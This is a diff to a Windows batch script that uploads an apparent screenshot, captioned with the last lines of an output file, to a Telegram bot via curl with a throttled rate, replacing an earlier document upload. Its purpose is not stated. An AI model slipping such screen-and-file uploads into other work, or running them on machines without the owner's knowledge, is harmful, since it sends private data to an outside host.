@@ -102,12 +102,6 @@ echo 1 > "%temp%\run_once1.flag"
 
 
 
-:: Send Message 
-curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendMessage" ^
-     -d "chat_id=%CHAT_ID_MyScrn%" ^
-     -d "message_thread_id=%TOPIC_ID_MyScrn%" ^
-     -d "text=Waiting30Sec"
-
 
 
 timeout /t 30 /nobreak
@@ -137,21 +131,23 @@ echo Last 7 lines have been saved to %output_file%
 for /f "delims=" %%a in ('powershell -Command "(Get-Content '%output_file%' | Out-String).Trim() -replace ' ', '%%20' -replace '&', '%%26' -replace '\n', '%%0A'"') do set "CAPTION_MyScrn=%%a"
 
 
+
+
+:: Send Photo
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
+     -F "chat_id=%CHAT_ID_MyScrn%" ^
+     -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
+     -F "caption=%CAPTION_MyScrn%" ^
+     -F "photo=@%FILE_PATH_MyScrn%" ^
+     --limit-rate 50K
+
+
+
 :: Send Message 
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendMessage" ^
      -d "chat_id=%CHAT_ID_MyScrn%" ^
      -d "message_thread_id=%TOPIC_ID_MyScrn%" ^
-     -d "text=Sending Now!"
-
-
-:: Send the file (as a document)
-curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendDocument" ^
-     -F "chat_id=%CHAT_ID_MyScrn%" ^
-     -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
-     -F "caption=%CAPTION_MyScrn%" ^
-     -F "document=@%FILE_PATH_MyScrn%" ^
-     --limit-rate 50K
-
+     -d "text=Sent"
 
 
 
